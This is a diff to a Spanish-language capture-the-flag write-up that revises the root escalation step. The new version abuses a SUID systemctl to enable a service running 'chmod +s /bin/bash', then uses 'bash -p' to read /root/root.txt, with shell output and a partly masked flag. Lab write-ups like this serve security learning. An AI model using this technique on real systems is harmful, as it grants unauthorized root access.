@@ -247,16 +247,28 @@ Podemos observar que entre los binarios se encuentra systemctl, por lo cual vamo
 los siguientes comandos.
 
 1. Primero, creamos el archivo para la conexion de shell inversa
-1. creamos un servicio y lo ejecutamos con _systemcl_
-
+1. mediante el servicio creado le damos permisos _SUID_ a _/bin/bash_
+1. confirmamos que somos usuarios _root_ y leemos la flag
 ```bash
 $ TF=$(mktemp).service
-$ echo '[Service]
-> ExecStart=/bin/sh -c "cp /root/root.txt > /tmp/output.txt"
-> WantedBy=multi-user.target' > $TF
-
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF
 /bin/systemctl link $TF
-/bin/systemctl enable-now $TF
+/bin/systemctl enable --now $TF
+$ > > > > $ Created symlink from /etc/systemd/system/tmp.0KBttF7QOg.service to /tmp/tmp.0KBttF7QOg.service.
+$ Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.0KBttF7QOg.service to /tmp/tmp.0KBttF7QOg.service.
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ ls -l /bin/bash
+-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
+$ bash -p
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+cat /root/root.txt
+x5xfxxxx9fxax27x36xd3xax9x6c7xd5
 ```
 > Become root and get the last flag (/root/root.txt)
->
+> x5xfx85x9x0x9x7x6xd33ax9x6cxfx5
